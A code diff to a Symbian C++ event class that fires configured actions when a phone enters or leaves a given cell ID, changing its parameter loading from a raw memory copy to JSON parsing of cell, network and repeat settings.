@@ -9,6 +9,7 @@
  */
 
 #include "EventCellId.h"
+#include "Json.h"
 
 CEventCellId::CEventCellId(TUint32 aTriggerId) :
 	CAbstractEvent(EEvent_CellID, aTriggerId), iNetInfoPckg(iNetInfo)
@@ -47,9 +48,61 @@ void CEventCellId::ConstructL(const TDesC8& params)
 	BaseConstructL(params);
 	iPhone = CPhone::NewL();
 	iPhone->SetObserver(this);
-	//iCellParams = (TCellIdStruct*) iParams.Ptr();
-	Mem::Copy(&iCellParams, iParams.Ptr(), sizeof(iCellParams));
 	
+	RBuf paramsBuf;
+		
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
+		{
+		paramsBuf.Copy(params);
+		}
+	else
+		{
+		//TODO: not enough memory
+		}
+		
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve cell data
+		rootObject->GetIntL(_L("area"),iCellParams.iLAC);
+		rootObject->GetIntL(_L("network"),iCellParams.iMNC);
+		rootObject->GetIntL(_L("country"),iCellParams.iMCC);
+		rootObject->GetIntL(_L("id"),iCellParams.iCell);
+		
+		//retrieve exit action
+		if(rootObject->Find(_L("end")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("end"),iCellParams.iExitAction);
+			}
+		else
+			iCellParams.iExitAction = -1;
+			
+		//retrieve repeat action
+		if(rootObject->Find(_L("repeat")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("repeat"),iCellParams.iRepeatAction);
+			rootObject->GetIntL(_L("iter"),iCellParams.iIter);
+			rootObject->GetIntL(_L("delay"),iCellParams.iDelay);
+			}
+		else
+			{
+			iCellParams.iRepeatAction = -1;
+			iCellParams.iIter = 0;
+			iCellParams.iDelay = 0;
+			}
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
+
 	if(iCellParams.iCell != -1)
 		iCellParams.iCell = iCellParams.iCell & 0xFFFF;  // added jo'
 
@@ -72,33 +125,6 @@ void CEventCellId::StartEventL()
 	// Receives Notifications Changes of the CellID...
 	iPhone->NotifyCellIDChange(iNetInfoPckg);
 	}
-/*
-TBool CEventCellId::ConnectedToCellID()
-	{
-	__FLOG_1(_L("CellID: %d"), iNetInfo.iCellId);
-	__FLOG_1(_L("LAC: %d"), iNetInfo.iLocationAreaCode);
-	__FLOG(_L("MNC - MCC"));
-	__FLOG(iNetInfo.iNetworkId);
-	__FLOG(iNetInfo.iCountryCode);
-	
-	if (iCellParams.iCell != iNetInfo.iCellId)
-		return EFalse;
-	if (iCellParams.iLAC != iNetInfo.iLocationAreaCode)
-		return EFalse;
-
-	TBuf<CTelephony::KNetworkIdentitySize> paramMNC;
-	paramMNC.AppendNum(iCellParams.iMNC);
-	if (paramMNC != iNetInfo.iNetworkId)
-		return EFalse;
-
-	TBuf<CTelephony::KNetworkCountryCodeSize> paramMCC;
-	paramMCC.AppendNum(iCellParams.iMCC);
-	if (paramMCC != iNetInfo.iCountryCode)
-		return EFalse;
- 
-	return ETrue; 
-	}
-*/
 
 // This has been changed in order to permit "*" (-1) value in console configuration build
 TBool CEventCellId::ConnectedToCellID()
@@ -153,7 +179,7 @@ void CEventCellId::HandlePhoneEventL(TPhoneFunctions event)
 			{
 			iWasConnectedToCell = EFalse;
 			// Triggers the Out-Action
-			if (iCellParams.iExitAction != 0xFFFFFFFF)
+			if (iCellParams.iExitAction != -1)
 				{
 				SendActionTriggerToCoreL(iCellParams.iExitAction);
 				}
